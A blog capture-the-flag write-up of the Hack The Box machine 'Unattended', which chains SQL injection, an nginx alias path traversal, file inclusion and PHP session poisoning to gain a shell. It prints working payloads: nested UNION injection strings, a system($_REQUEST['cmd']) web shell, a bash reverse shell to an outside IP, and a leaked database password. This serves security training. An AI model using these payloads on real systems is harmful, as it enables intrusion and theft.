title="[HTB] Machine: Json">[HTB] Machine: Json</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/legacy/ title="[HTB] Machine: Legacy">[HTB] Machine: Legacy</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/love/ title="[HTB] Machine: Love">[HTB] Machine: Love</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/mantis/ title="[HTB] Machine: Mantis">[HTB] Machine: Mantis</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/minion/ title="[HTB] Machine: Minion">[HTB] Machine: Minion</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/monteverde/ title="[HTB] Machine: Monteverde">[HTB] Machine: Monteverde</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/multimaster/ title="[HTB] Machine: Multimaster">[HTB] Machine: Multimaster</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/nest/ title="[HTB] Machine: Nest">[HTB] Machine: Nest</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/netmon/ title="[HTB] Machine: Netmon">[HTB] Machine: Netmon</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/object/ title="[HTB] Machine: Object">[HTB] Machine: Object</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/omni/ title="[HTB] Machine: Omni">[HTB] Machine: Omni</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/optimum/ title="[HTB] Machine: Optimum">[HTB] Machine: Optimum</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/outdated/ title="[HTB] Machine: Outdated">[HTB] Machine: Outdated</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/pivotapi/ title="[HTB] Machine: PivotAPI">[HTB] Machine: PivotAPI</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/querier/ title="[HTB] Machine: Querier">[HTB] Machine: Querier</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/rabbit/ title="[HTB] Machine: Rabbit">[HTB] Machine: Rabbit</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/reel/ title="[HTB] Machine: Reel">[HTB] Machine: Reel</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/reel2/ title="[HTB] Machine: Reel2">[HTB] Machine: Reel2</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/remote/ title="[HTB] Machine: Remote">[HTB] Machine: Remote</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/resolute/ title="[HTB] Machine: Resolute">[HTB] Machine: Resolute</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/return/ title="[HTB] Machine: Return">[HTB] Machine: Return</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/sauna/ title="[HTB] Machine: Sauna">[HTB] Machine: Sauna</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/scrambled/ title="[HTB] Machine: Scrambled">[HTB] Machine: Scrambled</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/search/ title="[HTB] Machine: Search">[HTB] Machine: Search</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/secnotes/ title="[HTB] Machine: SecNotes">[HTB] Machine: SecNotes</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/servmon/ title="[HTB] Machine: Servmon">[HTB] Machine: Servmon</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/sharp/ title="[HTB] Machine: Sharp">[HTB] Machine: Sharp</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/silo/ title="[HTB] Machine: Silo">[HTB] Machine: Silo</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/sizzle/ title="[HTB] Machine: Sizzle">[HTB] Machine: Sizzle</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/sniper/ title="[HTB] Machine: Sniper">[HTB] Machine: Sniper</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/streamio/ title="[HTB] Machine: StreamIO">[HTB] Machine: StreamIO</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/support/ title="[HTB] Machine: Support">[HTB] Machine: Support</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/tally/ title="[HTB] Machine: Tally">[HTB] Machine: Tally</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/timelapse/ title="[HTB] Machine: Timelapse">[HTB] Machine: Timelapse</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/toolbox/ title="[HTB] Machine: Toolbox">[HTB] Machine: Toolbox</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/worker/ title="[HTB] Machine: Worker">[HTB] Machine: Worker</a></li></ul></li></ul></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/overview/ title="[HTB] Overview">[HTB] Overview</a></li></ul></li><li><i data-feather=plus-circle></i><a class=list-link href=/posts/cybersecurity/pentesting/> Pentesting</a><ul><li><a class=list-link href=/posts/cybersecurity/pentesting/active_directory/ title="[Pentesting] Active Directory">[Pentesting] Active Directory</a></li><li><a class=list-link href=/posts/cybersecurity/pentesting/attacking_services/ title="[Pentesting] Attacking Services">[Pentesting] Attacking Services</a></li><li><a class=list-link href=/posts/cybersecurity/pentesting/file_transfers/ title="[Pentesting] File Transfers">[Pentesting] File Transfers</a></li><li><a class=list-link href=/posts/cybersecurity/pentesting/footprinting_and_enumeration/ title="[Pentesting] Footprinting and Enumeration">[Pentesting] Footprinting and Enumeration</a></li><li><a class=list-link href=/posts/cybersecurity/pentesting/linux_privilege_escalation/ title="[Pentesting] Linux Privilege Escalation">[Pentesting] Linux Privilege Escalation</a></li><li><a class=list-link href=/posts/cybersecurity/pentesting/mobile_pentesting/ title="[Pentesting] Mobile Pentesting">[Pentesting] Mobile Pentesting</a></li><li><a class=list-link href=/posts/cybersecurity/pentesting/network_pentesting/ title="[Pentesting] Network Pentesting">[Pentesting] Network Pentesting</a></li><li><a class=list-link href=/posts/cybersecurity/pentesting/osint/ title="[Pentesting] OSINT">[Pentesting] OSINT</a></li><li><a class=list-link href=/posts/cybersecurity/pentesting/pivoting_tunneling_and_port_forwarding/ title="[Pentesting] Pivoting, Tunneling and Port Forwarding">[Pentesting] Pivoting, Tunneling and Port Forwarding</a></li><li><a class=list-link href=/posts/cybersecurity/pentesting/shells_and_payloads/ title="[Pentesting] Shells and Payloads">[Pentesting] Shells and Payloads</a></li><li><a class=list-link href=/posts/cybersecurity/pentesting/web_attacks/ title="[Pentesting] Web Attacks">[Pentesting] Web Attacks</a></li><li><a class=list-link href=/posts/cybersecurity/pentesting/windows_privilege_escalation/ title="[Pentesting] Windows Privilege Escalation">[Pentesting] Windows Privilege Escalation</a></li></ul></li><li><i data-feather=plus-circle></i><a class=list-link href=/posts/cybersecurity/pwn.college/> pwn.college</a><ul><li><a class=list-link href=/posts/cybersecurity/pwn.college/overview/ title="[pwn.college] Overview">[pwn.college] Overview</a></li></ul></li></ul></li><li><i data-feather=plus-circle></i><a class=list-link href=/posts/projects/> Projects</a><ul><li><a class=list-link href=/posts/projects/ums/ title="[Projects] User-mode Scheduling (UMS)">[Projects] User-mode Scheduling (UMS)</a></li></ul></li></div></ul></div></div></div></section><section class=content-section id=content-section><div class=content><div class="container p-0 read-area"><div class="hero-area col-sm-12" id=hero-area style=background-image:url(/posts/cybersecurity/hackthebox/machines/linux/unattended/images/unattended.png)></div><div class=page-content><div class="author-profile ms-auto align-self-lg-center"><img class=rounded-circle src=/images/logo_hu18178778581203962172.png alt="Author Image"><h5 class=author-name>Bektur Umarbaev</h5><p class=text-muted>Wednesday, October 25, 2023 | 15 minutes</p></div><div class=title><h1>[HTB] Machine: Unattended</h1></div><div class=tags><ul style=padding-left:0><li class=rounded><a href=/tags/htb/ class="btn btn-sm btn-info">HTB</a></li><li class=rounded><a href=/tags/sqli/ class="btn btn-sm btn-info">sqli</a></li><li class=rounded><a href=/tags/sqlmap/ class="btn btn-sm btn-info">sqlmap</a></li><li class=rounded><a href=/tags/nginx/ class="btn btn-sm btn-info">nginx</a></li><li class=rounded><a href=/tags/nginx-aliases/ class="btn btn-sm btn-info">nginx-aliases</a></li><li class=rounded><a href=/tags/lfi/ class="btn btn-sm btn-info">lfi</a></li><li class=rounded><a href=/tags/session-poisoning/ class="btn btn-sm btn-info">session-poisoning</a></li><li class=rounded><a href=/tags/socat/ class="btn btn-sm btn-info">socat</a></li><li class=rounded><a href=/tags/hidepid/ class="btn btn-sm btn-info">hidepid</a></li><li class=rounded><a href=/tags/noexec/ class="btn btn-sm btn-info">noexec</a></li><li class=rounded><a href=/tags/mysql/ class="btn btn-sm btn-info">mysql</a></li><li class=rounded><a href=/tags/initrd/ class="btn btn-sm btn-info">initrd</a></li><li class=rounded><a href=/tags/cpio/ class="btn btn-sm btn-info">cpio</a></li></ul></div><div class=post-content id=post-content><h1 id=unattended>Unattended</h1><h2 id=enumeration>Enumeration</h2><ul><li><code>nmap</code></li></ul><pre tabindex=0><code>└─$ nmap -Pn -p- 10.10.10.126 --min-rate 5000                                     
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-27 16:02 BST
Nmap scan report for 10.10.10.126 (10.10.10.126)
Host is up (0.17s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT    STATE SERVICE
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 38.83 seconds
</code></pre><pre tabindex=0><code>└─$ nmap -Pn -p80,443 -sC -sV 10.10.10.126 --min-rate 5000
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-27 16:04 BST
Nmap scan report for 10.10.10.126 (10.10.10.126)
Host is up (0.20s latency).

PORT    STATE SERVICE  VERSION
80/tcp  open  http     nginx 1.10.3
|_http-title: Site doesn&#39;t have a title (text/html).
|_http-server-header: nginx/1.10.3
443/tcp open  ssl/http nginx 1.10.3
|_http-title: Site doesn&#39;t have a title (text/html).
| ssl-cert: Subject: commonName=www.nestedflanders.htb/organizationName=Unattended ltd/stateOrProvinceName=IT/countryName=IT
| Not valid before: 2018-12-19T09:43:58
|_Not valid after:  2021-09-13T09:43:58
|_http-server-header: nginx/1.10.3

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.19 seconds
</code></pre><ul><li>Web server</li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/unattended/images/1.png></p><ul><li><code>vhosts</code></li></ul><pre tabindex=0><code>└─$ wfuzz -u https://www.nestedflanders.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H &#39;Host: FUZZ.nestedflanders.htb&#39; --hw 1
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#39;s documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://www.nestedflanders.htb/
Total requests: 19966

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    
=====================================================================

000000001:   200        368 L    933 W      10701 Ch    &#34;www&#34;
</code></pre><ul><li><code>gobuster</code></li></ul><pre tabindex=0><code>└─$ gobuster dir -u https://www.nestedflanders.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html -t 50 -k -b 404,503 --exclude-length 311
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://www.nestedflanders.htb
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   503,404
[+] Exclude Length:          311
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 291]
/.php                 (Status: 403) [Size: 290]
/index.php            (Status: 200) [Size: 1244]
/dev                  (Status: 301) [Size: 1]
</code></pre><h2 id=foothold>Foothold</h2><ul><li>We have 3 pages on <code>https://www.nestedflanders.htb/index.php</code><ul><li>Click <code>main</code> and you will see <code>?id=25</code></li><li>Other pages show identical parameter but with other value</li><li>If we visit <code>about</code> page, but also add <code>'</code>, like <code>https://www.nestedflanders.htb/index.php?id=465'</code>, we are redirected to <code>main</code> page</li><li>Let&rsquo;s launch <code>sqlmap</code></li></ul></li></ul><pre tabindex=0><code>└─$ sqlmap -u &#39;https://www.nestedflanders.htb/index.php?id=465&#39; --batch   
&lt;SNIP&gt;
GET parameter &#39;id&#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 300 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=465&#39; AND 1933=1933 AND &#39;petC&#39;=&#39;petC

    Type: time-based blind
    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=465&#39; AND (SELECT 5116 FROM (SELECT(SLEEP(5)))hwSG) AND &#39;EjoV&#39;=&#39;EjoV
---
[16:31:09] [INFO] the back-end DBMS is MySQL
web application technology: PHP, Nginx 1.10.3
back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)
[16:31:09] [INFO] fetched data logged to text files under &#39;/home/kali/.local/share/sqlmap/output/www.nestedflanders.htb&#39;

[*] ending @ 16:31:09 /2023-10-28/
</code></pre><ul><li>I&rsquo;ll dump the databases and the tables</li></ul><pre tabindex=0><code>└─$ sqlmap -u &#39;https://www.nestedflanders.htb/index.php?id=465&#39; --batch --dbs
&lt;SNIP&gt;
available databases [2]:
[*] information_schema
[*] neddy
</code></pre><pre tabindex=0><code>└─$ sqlmap -u &#39;https://www.nestedflanders.htb/index.php?id=465&#39; --batch -D neddy --tables
&lt;SNIP&gt;
Database: neddy
[11 tables]
+--------------+
| config       |
| customers    |
| employees    |
| filepath     |
| idname       |
| offices      |
| orderdetails |
| orders       |
| payments     |
| productlines |
| products     |
+--------------+
</code></pre><ul><li>I&rsquo;ll dump everyting in the background</li><li>If we visit <code>dev</code> it says <code>dev site has been moved to his own server</code><ul><li>Could be <code>dev.nestedflanders.htb</code></li><li>I tried fuzzing subdomains but no luck</li><li>Based on forum hints, I got on the right track</li><li>So there seems like another way to path traverse if <code>nginx</code> is used as proxy<ul><li><a href=https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/ target=_blank rel=noopener>https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/</a></li><li><a href="https://www.youtube.com/watch?v=CIhHpkybYsY&amp;t=572s" target=_blank rel=noopener>https://www.youtube.com/watch?v=CIhHpkybYsY&t=572s</a></li></ul></li><li>If location doesn&rsquo;t end with <code>/</code>, we can esca[e the path</li></ul></li></ul><pre tabindex=0><code>location /i { # Have to be /i/
    alias /data/w3/images/;
}
</code></pre><ul><li>We can test for misconfiguration<ul><li>If we consider basic path: <code>/var/www/</code>, we gave <code>html</code> and probably <code>dev</code> folders</li><li>We can&rsquo;t traverse to <code>html</code>, since we are in <code>dev</code></li><li>But if we perform path traversing mentioned above, we have a hit</li></ul></li></ul><pre tabindex=0><code>└─$ curl -s -k -i https://www.nestedflanders.htb/dev/../html/index.html | grep HTTP
HTTP/1.1 404 Not Found
</code></pre><pre tabindex=0><code>└─$ curl -s -k -i https://www.nestedflanders.htb/dev../html/index.html | grep HTTP
HTTP/1.1 200 OK
                If you can read this page, it means that the Apache HTTP server installed at
                &lt;tt&gt;/var/www/html/index.html&lt;/tt&gt;) before continuing to operate your HTTP server.
                                                                                                    
</code></pre><ul><li>We can dump the <code>index.php</code> which was used in root path</li></ul><pre tabindex=0><code>└─$ curl -s -k -i https://www.nestedflanders.htb/dev../html/index.php            
HTTP/1.1 200 OK
Server: nginx/1.10.3
Date: Sat, 28 Oct 2023 16:33:51 GMT
Content-Type: application/octet-stream
Content-Length: 2721
Last-Modified: Wed, 19 Dec 2018 15:37:40 GMT
Connection: keep-alive
ETag: &#34;5c1a65c4-aa1&#34;
Accept-Ranges: bytes

&lt;?php
$servername = &#34;localhost&#34;;
$username = &#34;nestedflanders&#34;;
$password = &#34;1036913cf7d38d4ea4f79b050f171e9fbf3f5e&#34;;
$db = &#34;neddy&#34;;
$conn = new mysqli($servername, $username, $password, $db);
$debug = False;

include &#34;6fb17817efb4131ae4ae1acae0f7fd48.php&#34;;

function getTplFromID($conn) {
        global $debug;
        $valid_ids = array (25,465,587);
        if ( (array_key_exists(&#39;id&#39;, $_GET)) &amp;&amp; (intval($_GET[&#39;id&#39;]) == $_GET[&#39;id&#39;]) &amp;&amp; (in_array(intval($_GET[&#39;id&#39;]),$valid_ids)) ) {
                        $sql = &#34;SELECT name FROM idname where id = &#39;&#34;.$_GET[&#39;id&#39;].&#34;&#39;&#34;;
        } else {
                $sql = &#34;SELECT name FROM idname where id = &#39;25&#39;&#34;;
        }
        if ($debug) { echo &#34;sqltpl: $sql&lt;br&gt;\n&#34;; } 

        $result = $conn-&gt;query($sql);
        if ($result-&gt;num_rows &gt; 0) {
        while($row = $result-&gt;fetch_assoc()) {
                $ret = $row[&#39;name&#39;];
        }
        } else {
                $ret = &#39;main&#39;;
        }
        if ($debug) { echo &#34;rettpl: $ret&lt;br&gt;\n&#34;; }
        return $ret;
}

function getPathFromTpl($conn,$tpl) {
        global $debug;
        $sql = &#34;SELECT path from filepath where name = &#39;&#34;.$tpl.&#34;&#39;&#34;;
        if ($debug) { echo &#34;sqlpath: $sql&lt;br&gt;\n&#34;; }
        $result = $conn-&gt;query($sql);
        if ($result-&gt;num_rows &gt; 0) {
                while($row = $result-&gt;fetch_assoc()) {
                        $ret = $row[&#39;path&#39;];
                }
        }
        if ($debug) { echo &#34;retpath: $ret&lt;br&gt;\n&#34;; }
        return $ret;
}

$tpl = getTplFromID($conn);
$inc = getPathFromTpl($conn,$tpl);
?&gt;

&lt;!DOCTYPE html&gt;
&lt;html lang=&#34;en&#34;&gt;
&lt;head&gt;
  &lt;title&gt;Ne(ste)d Flanders&lt;/title&gt;
  &lt;meta charset=&#34;utf-8&#34;&gt;
  &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1&#34;&gt;
  &lt;link rel=&#34;stylesheet&#34; href=&#34;bootstrap.min.css&#34;&gt;
  &lt;script src=&#34;jquery.min.js&#34;&gt;&lt;/script&gt;
  &lt;script src=&#34;bootstrap.min.js&#34;&gt;&lt;/script&gt;
&lt;/head&gt;
&lt;body&gt;

&lt;div class=&#34;container&#34;&gt;
  &lt;h1&gt;Ne(ste)d Flanders&#39; Portfolio&lt;/h1&gt;
&lt;/div&gt;

&lt;div class=&#34;container&#34;&gt;
&lt;div center class=&#34;row&#34;&gt;
&lt;?php

$sql = &#34;SELECT i.id,i.name from idname as i inner join filepath on i.name = filepath.name where disabled = &#39;0&#39; order by i.id&#34;;
if ($debug) { echo &#34;sql: $sql&lt;br&gt;\n&#34;; }

$result = $conn-&gt;query($sql);
if ($result-&gt;num_rows &gt; 0) {
        while($row = $result-&gt;fetch_assoc()) {
                //if ($debug) { echo &#34;rowid: &#34;.$row[&#39;id&#39;].&#34;&lt;br&gt;\n&#34;; } // breaks layout
                echo &#39;&lt;div class=&#34;col-md-2&#34;&gt;&lt;a href=&#34;index.php?id=&#39;.$row[&#39;id&#39;].&#39;&#34; target=&#34;maifreim&#34;&gt;&#39;.$row[&#39;name&#39;].&#39;&lt;/a&gt;&lt;/div&gt;&#39;;
                }
} else {
?&gt;
        &lt;div class=&#34;col-md-2&#34;&gt;&lt;a href=&#34;index.php?id=25&#34;&gt;main&lt;/a&gt;&lt;/div&gt;
        &lt;div class=&#34;col-md-2&#34;&gt;&lt;a href=&#34;index.php?id=465&#34;&gt;about&lt;/a&gt;&lt;/div&gt;
        &lt;div class=&#34;col-md-2&#34;&gt;&lt;a href=&#34;index.php?id=587&#34;&gt;contact&lt;/a&gt;&lt;/div&gt;
        &lt;?php
}

?&gt;
&lt;/div&gt; &lt;!-- row --&gt;
&lt;/div&gt; &lt;!-- container --&gt;


&lt;div class=&#34;container&#34;&gt;
&lt;div class=&#34;row&#34;&gt;
&lt;!-- &lt;div align=&#34;center&#34;&gt; --&gt;
&lt;?php
include(&#34;$inc&#34;);
?&gt;
&lt;!-- &lt;/div&gt; --&gt;

&lt;/div&gt; &lt;!-- row --&gt;
&lt;/div&gt; &lt;!-- container --&gt;
&lt;?php if ($debug) { echo &#34;include $inc;&lt;br&gt;\n&#34;; } ?&gt;

&lt;/body&gt;
&lt;/html&gt;

&lt;?php
$conn-&gt;close();
?&gt;
</code></pre><ul><li>We have a <code>LFI</code></li></ul><pre tabindex=0><code>&lt;SNIP&gt;
$conn = new mysqli($servername, $username, $password, $db);
$debug = False;
include &#34;6fb17817efb4131ae4ae1acae0f7fd48.php&#34;;

function getTplFromID($conn) {
        global $debug;
        $valid_ids = array (25,465,587);
        if ( (array_key_exists(&#39;id&#39;, $_GET)) &amp;&amp; (intval($_GET[&#39;id&#39;]) == $_GET[&#39;id&#39;]) &amp;&amp; (in_array(intval($_GET[&#39;id&#39;]),$valid_ids)) ) {
                        $sql = &#34;SELECT name FROM idname where id = &#39;&#34;.$_GET[&#39;id&#39;].&#34;&#39;&#34;;
        } else {
                $sql = &#34;SELECT name FROM idname where id = &#39;25&#39;&#34;;
        }
        if ($debug) { echo &#34;sqltpl: $sql&lt;br&gt;\n&#34;; } 

        $result = $conn-&gt;query($sql);
        if ($result-&gt;num_rows &gt; 0) {
        while($row = $result-&gt;fetch_assoc()) {
                $ret = $row[&#39;name&#39;];
        }
        } else {
                $ret = &#39;main&#39;;
        }
        if ($debug) { echo &#34;rettpl: $ret&lt;br&gt;\n&#34;; }
        return $ret;
}

function getPathFromTpl($conn,$tpl) {
        global $debug;
        $sql = &#34;SELECT path from filepath where name = &#39;&#34;.$tpl.&#34;&#39;&#34;;
        if ($debug) { echo &#34;sqlpath: $sql&lt;br&gt;\n&#34;; }
        $result = $conn-&gt;query($sql);
        if ($result-&gt;num_rows &gt; 0) {
                while($row = $result-&gt;fetch_assoc()) {
                        $ret = $row[&#39;path&#39;];
                }
        }
        if ($debug) { echo &#34;retpath: $ret&lt;br&gt;\n&#34;; }
        return $ret;
}

$tpl = getTplFromID($conn);
$inc = getPathFromTpl($conn,$tpl);
&lt;SNIP&gt;
&lt;?php
include(&#34;$inc&#34;);
?&gt;
&lt;!-- &lt;/div&gt; --&gt;

&lt;/div&gt; &lt;!-- row --&gt;
&lt;/div&gt; &lt;!-- container --&gt;
&lt;?php if ($debug) { echo &#34;include $inc;&lt;br&gt;\n&#34;; } ?&gt;

&lt;/body&gt;
&lt;/html&gt;

&lt;?php
&lt;SNIP&gt;
</code></pre><ul><li>Let&rsquo;s check another file included</li></ul><pre tabindex=0><code>└─$ curl -s -k -i https://www.nestedflanders.htb/dev../html/6fb17817efb4131ae4ae1acae0f7fd48.php
HTTP/1.1 200 OK
Server: nginx/1.10.3
Date: Sat, 28 Oct 2023 16:38:29 GMT
Content-Type: application/octet-stream
Content-Length: 256
Last-Modified: Wed, 19 Dec 2018 13:32:41 GMT
Connection: keep-alive
ETag: &#34;5c1a4879-100&#34;
Accept-Ranges: bytes

&lt;?php
session_start();
if (isset($_SESSION[&#39;user_name&#39;])){
        $user_name = $_SESSION[&#39;user_name&#39;];
}

foreach ($_COOKIE as $key =&gt; $val) {
        $_SESSION[$key] = $val;
}

/* removed everything because of undergoing investigation, please check dev and staging */
</code></pre><ul><li>We control the <code>id</code> value</li><li>But we have to bypass several checks from <code>(array_key_exists('id', $_GET)) && (intval($_GET['id']) == $_GET['id']) && (in_array(intval($_GET['id']),$valid_ids))</code><ul><li><code>array_key_exists('id', $_GET)</code> - The parameter needs to be present</li><li><code>in_array(intval($_GET['id']),$valid_ids)</code> - The number should be from <code>valid_ids</code></li><li><code>intval($_GET['id']) == $_GET['id']</code> - It uses <code>==</code> operator, which is <a href=https://stackoverflow.com/questions/80646/how-do-the-php-equality-double-equals-and-identity-triple-equals-comp target=_blank rel=noopener>different from <code>===</code></a><ul><li>Another thing is that <code>intval</code> processes the string which starts with <code>int</code>, while it drops the rest of it</li></ul></li></ul></li></ul><pre tabindex=0><code>php &gt; echo intval(&#34;13&#34;);
13
php &gt; echo intval(&#34;13 TEST&#34;);
13
php &gt; 
</code></pre><ul><li>Okay, since we got familiar with checks, we have to inject our payload to:<ul><li><code>SELECT name FROM idname where id = '".$_GET['id']."'</code></li><li><code>SELECT path from filepath where name = '".$tpl."'</code></li></ul></li><li><code>SELECT name FROM idname where id = '".$_GET['id']."'</code> returns the page if it exists in the table or it will return us the <code>main</code> page<ul><li>We have to control the output of the query</li><li>So we can make it return <code>False</code> then <code>UNION</code> query anything we want</li><li>The statement will be executed since it&rsquo;s a valid one and passes the check <code>$result->num_rows > 0</code></li><li>The payload will be in the form of: <code>&lt;VALID_ID>' AND 1=2 UNION SELECT "&lt;ANYTHING>"-- -</code></li><li>We can test it with <code>https://www.nestedflanders.htb/index.php?id=id=465' and 1=2 union select "about"-- -</code><ul><li>It should return <code>about</code> page</li></ul></li></ul></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/unattended/images/3.png></p><ul><li>Now, we have to inject to second query <code>SELECT path from filepath where name = '".$tpl."'</code><ul><li>The payload will had <code>&lt;VALID_ID>' AND 1=2 UNION SELECT "&lt;ANYTHING>"</code></li><li>Now we place the second payload instead of <code>ANYTHING</code><ul><li>Don&rsquo;t forget to escape the quotes</li></ul></li><li>Now, we have: <code>&lt;VALID_ID>' AND 1=2 UNION SELECT "TEST\' UNION SELECT \"/etc/passwd\"-- -"-- -</code></li><li>For example, <code>https://www.nestedflanders.htb/index.php?id=465' and 1=2 union select "test\' union select \"/etc/passwd\"-- -"-- -</code></li></ul></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/unattended/images/4.png></p><ul><li>To get a shell, we can perform <code>log/session poisoning</code><ul><li>There are 2 paths:<ul><li>via <code>/var/log/nginx/access.log</code><ul><li><a href=https://book.hacktricks.xyz/pentesting-web/file-inclusion#via-php-sessions target=_blank rel=noopener>https://book.hacktricks.xyz/pentesting-web/file-inclusion#via-php-sessions</a></li></ul></li><li>or via session cookie and <code>/var/lib/php/sessions/</code><ul><li><a href=https://book.hacktricks.xyz/pentesting-web/file-inclusion#via-php-sessions target=_blank rel=noopener>https://book.hacktricks.xyz/pentesting-web/file-inclusion#via-php-sessions</a></li></ul></li></ul></li><li>I have already done the attack in other boxes via first method, so I will try to do it using second one<ul><li><a href=https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/php-session target=_blank rel=noopener>https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/php-session</a></li></ul></li><li>First, we need to know our <code>PHPSESSID</code><ul><li>Then we prepend the prefix, like <code>sess_&lt;PHPSESSID></code></li><li>Now using via <code>LFI</code> we read <code>/var/lib/php/sessions/sess_&lt;PHPSESSID></code></li></ul></li></ul></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/unattended/images/5.png></p><ul><li>Now, we can set another cookie<ul><li>Make sure add space before new cookie</li></ul></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/unattended/images/6.png></p><ul><li>We now can insert <code>php</code> code, which should be executed<ul><li><code>SHELL=&lt;?php system($_REQUEST['cmd']); ?></code> - the code should be url-encoded</li></ul></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/unattended/images/7.png></p><ul><li>Great, let&rsquo;s get reverse shell<ul><li><code>bash -c '/bin/bash -i >& /dev/tcp/10.10.16.4/443 0>&amp;1'</code> - url-encoded</li></ul></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/unattended/images/8.png></p><h2 id=user>User</h2><ul><li>Looks like <code>hidepid</code> is configured<ul><li><a href=https://linux-audit.com/linux-system-hardening-adding-hidepid-to-proc/ target=_blank rel=noopener>https://linux-audit.com/linux-system-hardening-adding-hidepid-to-proc/</a></li></ul></li></ul><pre tabindex=0><code>www-data@unattended:/var/www/html$ ps awuxx
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
www-data   678  0.0  0.3 180664  6864 ?        S    09:21   0:00 nginx: worker process
www-data  1163  0.0  0.0   4288   740 ?        S    09:29   0:00 sh -c bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.16.4/443 0&gt;&amp;1&#39;
www-data  1164  0.0  0.1  17944  2816 ?        S    09:29   0:00 bash -c bash -i &gt;&amp; /dev/tcp/10.10.16.4/443 0&gt;&amp;1
www-data  1165  0.0  0.1  18168  3316 ?        S    09:29   0:00 bash -i
www-data  1187  0.0  0.4  35912  8468 ?        S    09:31   0:00 python3 -c import pty;pty.spawn(&#34;/bin/bash&#34;)
www-data  1188  0.0  0.1  18192  3252 pts/0    Ss   09:31   0:00 /bin/bash
www-data  1203  0.0  0.1  36636  2812 pts/0    R+   09:32   0:00 ps awuxx
</code></pre><ul><li><code>noexec</code> is configured on <code>tmp</code> and <code>/dev/shm</code></li></ul><pre tabindex=0><code>www-data@unattended:/$ mount | grep -e &#34;tmp &#34; -e shm
tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev,noexec)
tmpfs on /tmp type tmpfs (rw,nosuid,nodev,noexec,relatime)
